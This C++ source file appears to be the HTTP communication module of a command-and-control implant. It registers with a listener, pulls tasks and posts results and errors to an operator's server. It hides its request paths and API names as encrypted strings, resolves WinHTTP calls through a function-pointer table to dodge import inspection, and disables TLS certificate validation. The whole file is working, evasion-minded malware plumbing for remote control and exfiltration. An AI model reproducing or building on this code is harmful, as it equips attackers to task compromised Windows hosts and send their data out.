#include "Http.hpp"
#include "Instance.hpp"
#include "Win32.hpp"
#include "StringCrypt.hpp"
#include "SecureString.hpp"
#include "SecureWideString.hpp"
#include "SecureVector.hpp"
#include "SecureException.hpp"
#include <iostream>
#include <memory>

// Define storage for static members
SecureWideString Http::RegisterPath;
SecureWideString Http::TasksPath;
SecureWideString Http::ErrorPath;

void Http::PopulateVariables() {
    Http::RegisterPath = StringCrypt::DecryptString(StringCrypt::REGISTER_CRYPT).c_str();
    Http::RegisterPath.append(std::to_wstring(Instance::ListenerID).c_str());
    Http::TasksPath = StringCrypt::DecryptString(StringCrypt::TASKS_CRYPT).c_str();
    Http::TasksPath.append(std::to_wstring(Instance::ID).c_str());
    Http::ErrorPath = StringCrypt::DecryptString(StringCrypt::ERROR_CRYPT).c_str();
    Http::ErrorPath.append(std::to_wstring(Instance::ID).c_str());
}

std::pair<int, SecureString> Http::Get(LPCWSTR domain, LPCWSTR path, DWORD port) {
    pWinHttpCloseHandle _pWinHttpCloseHandle = (pWinHttpCloseHandle)Win32::WinHttpTable.pWinHttpCloseHandle.pAddress;
    pWinHttpConnect _pWinHttpConnect = (pWinHttpConnect)Win32::WinHttpTable.pWinHttpConnect.pAddress;
    pWinHttpOpen _pWinHttpOpen = (pWinHttpOpen)Win32::WinHttpTable.pWinHttpOpen.pAddress;
    pWinHttpOpenRequest _pWinHttpOpenRequest = (pWinHttpOpenRequest)Win32::WinHttpTable.pWinHttpOpenRequest.pAddress;
    pWinHttpQueryDataAvailable _pWinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)Win32::WinHttpTable.pWinHttpQueryDataAvailable.pAddress;
    pWinHttpReadData _pWinHttpReadData = (pWinHttpReadData)Win32::WinHttpTable.pWinHttpReadData.pAddress;
    pWinHttpReceiveResponse _pWinHttpReceiveResponse = (pWinHttpReceiveResponse)Win32::WinHttpTable.pWinHttpReceiveResponse.pAddress;
    pWinHttpSendRequest _pWinHttpSendRequest = (pWinHttpSendRequest)Win32::WinHttpTable.pWinHttpSendRequest.pAddress;
    pWinHttpWriteData _pWinHttpWriteData = (pWinHttpWriteData)Win32::WinHttpTable.pWinHttpWriteData.pAddress;
    pWinHttpQueryHeaders _pWinHttpQueryHeaders = (pWinHttpQueryHeaders)Win32::WinHttpTable.pWinHttpQueryHeaders.pAddress;
    pWinHttpSetOption _pWinHttpSetOption = (pWinHttpSetOption)Win32::WinHttpTable.pWinHttpSetOption.pAddress;

    DWORD dwSize = 0, dwDownloaded = 0;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    try {
        hSession = _pWinHttpOpen(Instance::UserAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession)
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPOPEN_CRYPT)));

        hConnect = _pWinHttpConnect(hSession, domain, port, 0);
        if (!hConnect)
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPCONNECT_CRYPT)));

        if (Instance::SSL) {
            hRequest = _pWinHttpOpenRequest(hConnect, SecureWideString(StringCrypt::DecryptString(StringCrypt::GET_CRYPT).c_str()).c_str(), path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (!hRequest)
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPOPENREQUEST_CRYPT)));

            DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            if (!_pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPSETOPTION_CRYPT)));
        }   
        else {
            hRequest = _pWinHttpOpenRequest(hConnect, SecureWideString(StringCrypt::DecryptString(StringCrypt::GET_CRYPT).c_str()).c_str(), path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!hRequest)
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPOPENREQUEST_CRYPT)));
        }

        if (!_pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPSENDREQUEST_CRYPT)));

        if (!_pWinHttpReceiveResponse(hRequest, NULL))
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPRECEIVERESPONSE_CRYPT)));
        
        // Query for the status code
        DWORD statusCode = 0;
        DWORD dwSize = sizeof(statusCode);
        if (!_pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPQUERYHEADERS_CRYPT)));
        }

        SecureVector<unsigned char> buf;

        do {
            if (!_pWinHttpQueryDataAvailable(hRequest, &dwSize))
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPQUERYDATAAVAILABLE_CRYPT)));

            std::unique_ptr<unsigned char[]> pszOutBuffer(new unsigned char[dwSize + 1]);
            ZeroMemory(pszOutBuffer.get(), dwSize + 1);

            if (!_pWinHttpReadData(hRequest, (LPVOID)pszOutBuffer.get(), dwSize, &dwDownloaded))
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPREADDATA_CRYPT)));

            buf.insert(buf.end(), pszOutBuffer.get(), pszOutBuffer.get() + dwDownloaded);
        } while (dwSize > 0);

        if (hRequest) {
            _pWinHttpCloseHandle(hRequest);
        }
        if (hConnect) {
            _pWinHttpCloseHandle(hConnect);
        }
        if (hSession) {
            _pWinHttpCloseHandle(hSession);
        }
        
        // Convert the buffer to SecureString
        if (!buf.empty()) {
			SecureString result(buf.begin(), buf.end());
			return { static_cast<int>(statusCode), result };
		}
        else {
			return { static_cast<int>(statusCode), SecureString() };
		}
    }
    catch (const SecureException& e) {
        if (hRequest) {
            _pWinHttpCloseHandle(hRequest);
        }
        if (hConnect) {
            _pWinHttpCloseHandle(hConnect);
        }
        if (hSession) {
            _pWinHttpCloseHandle(hSession);
        }
        throw;
    }
    catch (...) {
        if (hRequest) {
            _pWinHttpCloseHandle(hRequest);
        }
        if (hConnect) {
            _pWinHttpCloseHandle(hConnect);
        }
        if (hSession) {
            _pWinHttpCloseHandle(hSession);
        }
        throw;
    }
}

SecureString Http::Post(LPCWSTR domain, LPCWSTR path, DWORD port, const SecureString& idata) {
    pWinHttpCloseHandle _pWinHttpCloseHandle = (pWinHttpCloseHandle)Win32::WinHttpTable.pWinHttpCloseHandle.pAddress;
    pWinHttpConnect _pWinHttpConnect = (pWinHttpConnect)Win32::WinHttpTable.pWinHttpConnect.pAddress;
    pWinHttpOpen _pWinHttpOpen = (pWinHttpOpen)Win32::WinHttpTable.pWinHttpOpen.pAddress;
    pWinHttpOpenRequest _pWinHttpOpenRequest = (pWinHttpOpenRequest)Win32::WinHttpTable.pWinHttpOpenRequest.pAddress;
    pWinHttpQueryDataAvailable _pWinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)Win32::WinHttpTable.pWinHttpQueryDataAvailable.pAddress;
    pWinHttpReadData _pWinHttpReadData = (pWinHttpReadData)Win32::WinHttpTable.pWinHttpReadData.pAddress;
    pWinHttpReceiveResponse _pWinHttpReceiveResponse = (pWinHttpReceiveResponse)Win32::WinHttpTable.pWinHttpReceiveResponse.pAddress;
    pWinHttpSendRequest _pWinHttpSendRequest = (pWinHttpSendRequest)Win32::WinHttpTable.pWinHttpSendRequest.pAddress;
    pWinHttpWriteData _pWinHttpWriteData = (pWinHttpWriteData)Win32::WinHttpTable.pWinHttpWriteData.pAddress;
    pWinHttpSetOption _pWinHttpSetOption = (pWinHttpSetOption)Win32::WinHttpTable.pWinHttpSetOption.pAddress;

    DWORD headersLength = -1, dwSize = 0, dwDownloaded = 0, dwBytesWritten = 0;
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    try {
        hSession = _pWinHttpOpen(Instance::UserAgent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPOPEN_CRYPT)));
        }

        hConnect = _pWinHttpConnect(hSession, domain, port, 0);
        if (!hConnect) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPCONNECT_CRYPT)));
        }

        if (Instance::SSL) {
            hRequest = _pWinHttpOpenRequest(hConnect, SecureWideString(StringCrypt::DecryptString(StringCrypt::POST_CRYPT).c_str()).c_str(), path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (!hRequest)
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPOPENREQUEST_CRYPT)));

            DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            if (!_pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPSETOPTION_CRYPT)));
        }
        else {
            hRequest = _pWinHttpOpenRequest(hConnect, SecureWideString(StringCrypt::DecryptString(StringCrypt::POST_CRYPT).c_str()).c_str(), path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (!hRequest)
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPOPENREQUEST_CRYPT)));
        }

        bResults = _pWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)idata.c_str(), idata.size(), idata.size(), 0);
        if (!bResults) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPSENDREQUEST_CRYPT)));
        }

        bResults = _pWinHttpReceiveResponse(hRequest, NULL);
        if (!bResults) {
            throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPRECEIVERESPONSE_CRYPT)));
        }

        SecureVector<unsigned char> buf;
        do {
            dwSize = 0;
            if (!_pWinHttpQueryDataAvailable(hRequest, &dwSize)) {
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPQUERYDATAAVAILABLE_CRYPT)));
            }

            std::unique_ptr<unsigned char[]> pszOutBuffer(new unsigned char[dwSize + 1]);
            ZeroMemory(pszOutBuffer.get(), dwSize + 1);
            if (!_pWinHttpReadData(hRequest, (LPVOID)pszOutBuffer.get(), dwSize, &dwDownloaded)) {
                throw SecureException(Instance::FormatLastError(StringCrypt::DecryptString(StringCrypt::PWINHTTPREADDATA_CRYPT)));
            }

            buf.insert(buf.end(), pszOutBuffer.get(), pszOutBuffer.get() + dwDownloaded);
        } while (dwSize > 0);

        if (hRequest) {
            _pWinHttpCloseHandle(hRequest);
        }
        if (hConnect) {
            _pWinHttpCloseHandle(hConnect);
        }
        if (hSession) {
            _pWinHttpCloseHandle(hSession);
        }

        if (!buf.empty()) {
			SecureString result(buf.begin(), buf.end());
			return result;
		}
        else {
			return SecureString();
		}
    }
    catch (const SecureException& e) {
        if (hRequest) {
            _pWinHttpCloseHandle(hRequest);
        }
        if (hConnect) {
            _pWinHttpCloseHandle(hConnect);
        }
        if (hSession) {
            _pWinHttpCloseHandle(hSession);
        }
        throw;
    }
    catch (...) {
        if (hRequest) {
            _pWinHttpCloseHandle(hRequest);
        }
        if (hConnect) {
            _pWinHttpCloseHandle(hConnect);
        }
        if (hSession) {
            _pWinHttpCloseHandle(hSession);
        }
        throw;
    }
}
